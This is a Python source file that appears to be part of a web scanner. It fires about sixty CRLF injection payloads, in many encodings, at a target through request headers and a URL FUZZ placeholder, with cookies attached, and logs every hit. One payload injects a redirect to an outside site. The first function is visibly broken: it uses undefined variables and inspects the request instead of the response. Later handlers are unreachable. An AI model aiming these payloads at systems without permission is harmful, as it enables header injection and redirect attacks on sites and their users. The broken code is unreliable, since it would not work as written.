from concurrent.futures import ThreadPoolExecutor
import itertools
import requests

def crlf_header_inject(prev_headers, main_url, num_threads,cookies):
    
    header_values = [
    "%0AHeader-Test:BLATRUC",
    "%0A%20Header-Test:BLATRUC",
    "%20%0AHeader-Test:BLATRUC",
    "%23%OAHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "%3F%0AHeader-Test:BLATRUC",
    "crlf%0AHeader-Test:BLATRUC",
    "crlf%0A%20Header-Test:BLATRUC",
    "crlf%20%0AHeader-Test:BLATRUC",
    "crlf%23%OAHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "crlf%3F%0AHeader-Test:BLATRUC",
    "%0DHeader-Test:BLATRUC",
    "%0D%20Header-Test:BLATRUC",
    "%20%0DHeader-Test:BLATRUC",
    "%23%0DHeader-Test:BLATRUC",
    "%23%0AHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "%3F%0DHeader-Test:BLATRUC",
    "crlf%0DHeader-Test:BLATRUC",
    "crlf%0D%20Header-Test:BLATRUC",
    "crlf%20%0DHeader-Test:BLATRUC",
    "crlf%23%0DHeader-Test:BLATRUC",
    "crlf%23%0AHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "crlf%3F%0DHeader-Test:BLATRUC",
    "%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%20Header-Test:BLATRUC",
    "%20%0D%0AHeader-Test:BLATRUC",
    "%23%0D%0AHeader-Test:BLATRUC",
    "\\r\\nHeader-Test:BLATRUC",
    "%20%5Cr%5Cn%20Header-Test:BLATRUC",
    "\\r\\n Header-Test:BLATRUC",
    "%5cr%5cnHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "%3F%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0A%20Header-Test:BLATRUC",
    "crlf%20%0D%0AHeader-Test:BLATRUC",
    "crlf%23%0D%0AHeader-Test:BLATRUC",
    "crlf\\r\\nHeader-Test:BLATRUC",
    "crlf%5cr%5cnHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "crlf%3F%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%09Header-Test:BLATRUC",
    "crlf%0D%0A%09Header-Test:BLATRUC",
    "%250AHeader-Test:BLATRUC",
    "%25250AHeader-Test:BLATRUC",
    "%%0A0AHeader-Test:BLATRUC",
    "%25%30AHeader-Test:BLATRUC",
    "%25%30%61Header-Test:BLATRUC",
    "%u000AHeader-Test:BLATRUC",
    "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC",
    "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC",
    "/google.com/%2F..%0D%0AHeader-Test:BLATRUC",
    "/%0d%0aLocation:%20http://myweb.com"
]


    

    def inject_and_check_crlf(header_value):
        enable_header_inject = True
        try:
            requests.get(main_url, headers=prev_headers,cookies=cookies, timeout=30)
        except Exception as e:
            print(f"exeption occured ! {e}")
            enable_header_inject = False

        for key in headers:
            if any(keyword in key for keyword in ["Date", "Content-Type", "Connection", "Host", "Content-Length", "Authorization", "Accept-Encoding"]):
                continue

            modified_headers = headers.copy()
            modified_headers[key] = header_value

            try:
                print(" " * 50, end="\r")
                print(f"\tCurrent header: {key}: {modified_headers[key]}              ", end="\r")

                if enable_header_inject:
                    response = requests.get(main_url, headers=modified_headers, cookies=cookies,timeout=30)
                else:
                    continue

                enable_header_inject = True
                #response_text = response.text.lower()

                target_string="Header-Test"
                target_value="BLATRUC"
                for header_response, value_response in request.headers.items():
                    if target_string in header_response or target_value in value_response :
                        print(f"The target string '{target_string}' was found in the header: {found_header}, with value: {found_value}.")
                        string_to_write = f"\n[*] URL: {url} | {key}:{header_value}"
                        with open('xsslogabhi/crlf_logs.txt', 'a') as f1:
                            f1.write(string_to_write+"\n")
                            print("\t-->", string_to_write)
                    else:
                        print(f"The target string '{target_string}' was not found in the request headers.")
            

            except requests.exceptions.Timeout:
                print("\tHeader exception occurred, Request timed out")
                enable_header_inject = False
            except requests.exceptions.RequestException as e:
                print(f"\tRequest error: {e}")
                enable_header_inject = False

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(inject_and_check_crlf, header_values)






def crlf_get_inject(headers, url_for_fuzz, num_threads,cookies):
    
    crlf_payloads = [
    "%0AHeader-Test:BLATRUC",
    "%0A%20Header-Test:BLATRUC",
    "%20%0AHeader-Test:BLATRUC",
    "%23%OAHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "%3F%0AHeader-Test:BLATRUC",
    "crlf%0AHeader-Test:BLATRUC",
    "crlf%0A%20Header-Test:BLATRUC",
    "crlf%20%0AHeader-Test:BLATRUC",
    "crlf%23%OAHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC",
    "crlf%3F%0AHeader-Test:BLATRUC",
    "%0DHeader-Test:BLATRUC",
    "%0D%20Header-Test:BLATRUC",
    "%20%0DHeader-Test:BLATRUC",
    "%23%0DHeader-Test:BLATRUC",
    "%23%0AHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "%3F%0DHeader-Test:BLATRUC",
    "crlf%0DHeader-Test:BLATRUC",
    "crlf%0D%20Header-Test:BLATRUC",
    "crlf%20%0DHeader-Test:BLATRUC",
    "crlf%23%0DHeader-Test:BLATRUC",
    "crlf%23%0AHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC",
    "crlf%3F%0DHeader-Test:BLATRUC",
    "%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%20Header-Test:BLATRUC",
    "%20%0D%0AHeader-Test:BLATRUC",
    "%23%0D%0AHeader-Test:BLATRUC",
    "\\r\\nHeader-Test:BLATRUC",
    "%20%5Cr%5Cn%20Header-Test:BLATRUC",
    "\\r\\n Header-Test:BLATRUC",
    "%5cr%5cnHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "%3F%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0AHeader-Test:BLATRUC",
    "crlf%0D%0A%20Header-Test:BLATRUC",
    "crlf%20%0D%0AHeader-Test:BLATRUC",
    "crlf%23%0D%0AHeader-Test:BLATRUC",
    "crlf\\r\\nHeader-Test:BLATRUC",
    "crlf%5cr%5cnHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC",
    "crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC",
    "crlf%3F%0D%0AHeader-Test:BLATRUC",
    "%0D%0A%09Header-Test:BLATRUC",
    "crlf%0D%0A%09Header-Test:BLATRUC",
    "%250AHeader-Test:BLATRUC",
    "%25250AHeader-Test:BLATRUC",
    "%%0A0AHeader-Test:BLATRUC",
    "%25%30AHeader-Test:BLATRUC",
    "%25%30%61Header-Test:BLATRUC",
    "%u000AHeader-Test:BLATRUC",
    "//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC",
    "/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC",
    "/google.com/%2F..%0D%0AHeader-Test:BLATRUC"
]
    

    def inject_and_check_crlf(crlf_payload):
        try:
            print(" " * 50, end="\r")
            print(f"\tCLRF URL:",url_for_fuzz.replace("FUZZ",crlf_payload), end="\r")
            
            response = requests.get(url_for_fuzz.replace("FUZZ", crlf_payload), headers=headers, cookies=cookies,timeout=30)
            

            target_string = "header-test"
            target_value="blatruc"
            response_headers=response.headers.items()
            for header_response, value_response in response_headers:
                if target_string in header_response.lower() or target_value in value_response.lower():
                    print(f"The target string '{target_string}' was found in the header: {header_response}, with value: {value_response}.")
                    string_to_write = f"\n[*] URL:" +url_for_fuzz.replace("FUZZ",crlf_payload)
                    with open('xsslogabhi/crlf_get_logs.txt', 'a') as f1:
                        f1.write(string_to_write + "\n\t->"+header_response+":"+value_response+"\n")
                        print("\t-->", string_to_write)

        except Exception as e:
            print(f"Exception occurred! {e}")

        except requests.exceptions.Timeout:
            print("\tHeader exception occurred, Request timed out")
            enable_header_inject = False
        except requests.exceptions.RequestException as e:
            print(f"\tRequest error: {e}")
            enable_header_inject = False

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(inject_and_check_crlf, crlf_payloads)